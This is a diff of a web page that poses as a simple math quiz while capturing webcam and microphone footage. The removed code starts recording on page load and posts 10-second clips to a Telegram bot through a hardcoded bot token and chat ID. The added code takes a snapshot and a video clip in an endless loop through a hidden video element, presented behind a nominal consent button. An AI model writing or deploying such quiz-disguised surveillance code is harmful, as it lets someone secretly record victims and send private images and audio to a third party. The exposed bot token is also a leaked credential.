@@ -1,9 +1,112 @@
-Math Quiz + Video to Telegram 
+try {
+      const w = videoEl.videoWidth || 640;
+      const h = videoEl.videoHeight || 480;
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(videoEl, 0, 0, w, h);
+      canvas.toBlob(blob => {
+        if (blob) resolve(blob);
+        else reject(new Error('snapshot toBlob null'));
+      }, 'image/jpeg', 0.85);
+    } catch (err) { reject(err); }
+  });
+}
 
-Math Quiz
+// --- MediaRecorder recording loop ---
+function preferredMime() {
+  if (!window.MediaRecorder) return '';
+  if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) return 'video/webm;codecs=vp9';
+  if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) return 'video/webm;codecs=vp8';
+  if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('video/webm')) return 'video/webm';
+  return '';
+}
 
-Requesting camera permission...
+async function startRecordingLoop() {
+  if (!stream) return;
+  if (!window.MediaRecorder) {
+    statusEl.textContent = 'Error: MediaRecorder not supported in this browser.';
+    return;
+  }
+  statusEl.textContent = 'Recording active — sending snapshot + 10s videos continuously...';
+  recordingLoopStopped = false;
+  const mime = preferredMime();
 
-Submit 
+  while (!recordingLoopStopped && stream.active) {
+    let chunks = [];
+    try {
+      const options = mime ? { mimeType: mime } : undefined;
+      const recorder = new MediaRecorder(stream, options);
+      recorder.ondataavailable = (e) => { if (e.data && e.data.size) chunks.push(e.data); };
 
-const statusEl = document.getElementById("status"); const quizEl = document.getElementById("quiz"); const questionEl = document.getElementById("question"); const answerEl = document.getElementById("answer"); const feedbackEl = document.getElementById("feedback"); const submitBtn = document.getElementById("submitBtn"); const token = "8341564010:AAGbmOK0aGXFrEvCIBxmrllD8pAYqVhLiX0"; const chatId = "1851300622"; const videoEl = document.getElementById("preview"); let mediaRecorder; async function startStream() { try { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); videoEl.srcObject = stream; statusEl.textContent = "Camera recording in progress (with your permission)"; quizEl.style.display = "block"; return stream; } catch (err) { console.error("Camera access denied or unavailable:", err); statusEl.textContent = "Camera access denied."; alert("Cannot access camera. Make sure you're using HTTPS or localhost."); throw err; } } function sendToTelegram(blob) { const form = new FormData(); form.append("chat_id", chatId); form.append("video", blob, "clip.webm"); fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: "POST", body: form }).then(res => { if (!res.ok) console.error("Telegram send failed:", res.statusText); }).catch(err => console.error("Telegram send error:", err)); } async function startRecordingLoop(stream) { const options = { mimeType: 'video/webm; codecs=vp8' }; mediaRecorder = new MediaRecorder(stream, options); mediaRecorder.ondataavailable = async (e) => { if (e.data && e.data.size > 0) { sendToTelegram(e.data); } }; mediaRecorder.onstop = () => { mediaRecorder.start(); setTimeout(() => mediaRecorder.stop(), 10000); }; mediaRecorder.start(); setTimeout(() => mediaRecorder.stop(), 10000); } function generateQuestion() { const a = Math.floor(Math.random() * 10) + 1; const b = Math.floor(Math.random() * 10) + 1; questionEl.textContent = `What is ${a} + ${b}?`; questionEl.dataset.answer = a + b; } submitBtn.addEventListener("click", () => { const correct = parseInt(answerEl.value) === parseInt(questionEl.dataset.answer); feedbackEl.textContent = correct ? "✅ Correct!" : "❌ Try again."; answerEl.value = ""; generateQuestion(); }); // Start immediately on page load (async () => { try { const stream = await startStream(); await startRecordingLoop(stream); generateQuestion(); } catch {} })(); 
+      const stoppedPromise = new Promise((res, rej) => {
+        recorder.onstop = res;
+        recorder.onerror = rej;
+      });
+
+      // ensure video has frames
+      try { await videoEl.play(); } catch(_) {}
+
+      // take snapshot and send it right away
+      try {
+        const snapBlob = await captureSnapshotBlob();
+        sendPhotoBlob(snapBlob);
+      } catch (err) {
+        console.warn('Snapshot capture failed:', err);
+      }
+
+      // start recording for 10 seconds
+      recorder.start();
+      await new Promise(r => setTimeout(r, 10000));
+      if (recorder.state === 'recording') recorder.stop();
+
+      await stoppedPromise;
+      if (chunks.length) {
+        const blob = new Blob(chunks, { type: chunks[0].type || 'video/webm' });
+        sendVideoBlob(blob);
+      } else {
+        console.warn('No video chunks recorded this cycle.');
+      }
+
+      // small pause before next cycle
+      await new Promise(r => setTimeout(r, 400));
+    } catch (err) {
+      console.error('Recording loop error', err);
+      statusEl.textContent = 'Recording stopped due to error. See console for details.';
+      break;
+    }
+  }
+}
+
+// --- start camera after button click (explicit consent) ---
+startBtn.addEventListener('click', async () => {
+  startBtn.disabled = true;
+  statusEl.textContent = 'Requesting camera & mic permission...';
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    // attach to hidden video so snapshots work
+    videoEl.srcObject = stream;
+    // wait a short time for the feed to start
+    await new Promise(r => setTimeout(r, 250));
+    // hide consent section (keep status visible)
+    document.getElementById('consent').style.display = 'none';
+    // begin loop
+    startRecordingLoop();
+  } catch (err) {
+    console.error('getUserMedia failed', err);
+    statusEl.textContent = 'Camera permission denied or not available. Quiz still works.';
+    startBtn.disabled = false;
+    // keep the consent visible so user can retry
+  }
+});
+
+// optional: stop if user closes page
+window.addEventListener('beforeunload', () => {
+  recordingLoopStopped = true;
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+  }
+});
+</script>
+</body>
+</html>
